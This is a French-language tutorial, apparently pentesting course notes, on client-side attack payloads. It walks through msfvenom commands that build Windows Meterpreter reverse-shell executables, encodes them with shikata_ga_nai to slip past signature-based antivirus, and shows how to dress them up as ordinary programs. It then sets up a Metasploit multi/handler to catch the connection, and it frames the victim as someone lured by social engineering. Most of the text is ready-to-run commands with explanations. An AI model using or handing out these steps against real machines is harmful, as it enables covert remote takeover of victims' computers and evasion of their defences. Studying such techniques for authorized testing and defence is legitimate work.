# Payloads

## Vue d’ensemble

Un **payload** est la partie d’un exploit ou d’une chaîne de livraison qui s’exécute sur la cible après lancement. Dans les attaques côté client, le payload est généralement livré via un fichier ou un exécutable malveillant que la victime ouvre, puis il se connecte ensuite vers l’attaquant.

Les attaques côté client reposent sur **l’interaction humaine** plutôt que sur une vulnérabilité d’un service. Comme le payload est stocké sur le disque, la détection par antivirus est un point important.

## Attaques côté client

Les attaques côté client utilisent souvent l’ingénierie sociale pour pousser la cible à exécuter un fichier malveillant. Exemples courants :

- Documents malveillants.
- Exécutables portables.
- Faux installateurs ou droppers.

Le but est de faire exécuter le payload sur le système victime afin d’ouvrir une connexion inversée vers l’attaquant.

## Msfvenom

**Msfvenom** est un utilitaire en ligne de commande utilisé pour générer et encoder des payloads Metasploit pour différents systèmes d’exploitation et plateformes web. Il combine les anciens outils `msfpayload` et `msfencode` en un seul.

Il est couramment utilisé pour générer des payloads Meterpreter qui seront livrés à un système client. Une fois le fichier exécuté, il se connecte au handler du payload et fournit un accès à distance.

### Syntaxe courante

```bash
msfvenom -p <payload> LHOST=<ton_ip> LPORT=<port> -f <format> -o <fichier_sortie>
```

### Exemple

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ton_ip> LPORT=4444 -f exe -o payload.exe
```

### Explication des commandes

- `msfvenom` — génère le payload.
- `-p windows/meterpreter/reverse_tcp` — sélectionne le type de payload.
- `LHOST=<ton_ip>` — définit l’adresse IP de l’attaquant, vers laquelle la connexion inversée revient.
- `LPORT=4444` — définit le port sur la machine attaquante.
- `-f exe` — produit le payload au format exécutable Windows.
- `-o payload.exe` — enregistre le payload dans un fichier.

## Encodage des payloads

Comme de nombreuses solutions antivirus détectent les fichiers malveillants à l’aide de signatures, les payloads peuvent être encodés pour modifier leur apparence et contourner les anciennes détections basées sur les signatures.

L’encodage modifie le shellcode afin de changer la signature du payload sans casser son fonctionnement.

### Exemple

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ton_ip> LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded_payload.exe
```

### Explication des commandes

- `-e x86/shikata_ga_nai` — sélectionne l’encodeur.
- `-i 3` — applique l’encodage trois fois.
- `-f exe` — génère un exécutable Windows.
- `-o encoded_payload.exe` — enregistre le payload encodé.

### Note importante

L’encodage est surtout utile contre les anciens antivirus basés sur des signatures. Il ne garantit pas d’évasion face aux protections modernes.

## Shellcode

Le **shellcode** est un petit morceau de code utilisé comme payload dans une exploitation. Il tire son nom du fait que son objectif est souvent de fournir un shell de commandes sur le système cible.

Le shellcode est ce qui s’exécute réellement après l’exploitation ou la livraison du payload.

## Injection de payloads dans des exécutables portables Windows

Une technique courante dans les attaques côté client consiste à injecter un payload dans un fichier PE Windows afin qu’il paraisse légitime tout en exécutant du code malveillant à l’ouverture.

### Exemple

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ton_ip> LPORT=4444 -f exe -o malicious.exe
```

Cela crée un exécutable Windows autonome qui peut être livré à la cible.

### Option : ajouter de l’encodage

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ton_ip> LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o malicious.exe
```

Cela génère un exécutable encodé qui peut aider à contourner une détection antivirus simple.

## Handler du payload

Après la génération du payload, Metasploit doit écouter la connexion entrante.

### Exemple de configuration du handler

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ton_ip>
set LPORT 4444
run
```

### Explication des commandes

- `use exploit/multi/handler` — démarre un listener pour le payload.
- `set PAYLOAD windows/meterpreter/reverse_tcp` — aligne le handler avec le payload généré.
- `set LHOST <ton_ip>` — définit l’adresse IP de l’attaquant.
- `set LPORT 4444` — définit le port d’écoute.
- `run` — démarre le listener et attend la connexion de la cible.

## Pourquoi c’est important

Les payloads sont ce qui donne le contrôle à l’attaquant après la livraison et l’exécution. Dans les attaques côté client, les étapes les plus importantes sont la génération du payload, son encodage si nécessaire, sa livraison, puis la capture de la connexion inversée avec un handler.

## Idée clé

`msfvenom` sert à générer des payloads, l’encodage peut aider contre les antivirus basiques, et un `multi/handler` est nécessaire pour recevoir la connexion lorsque le payload s’exécute.
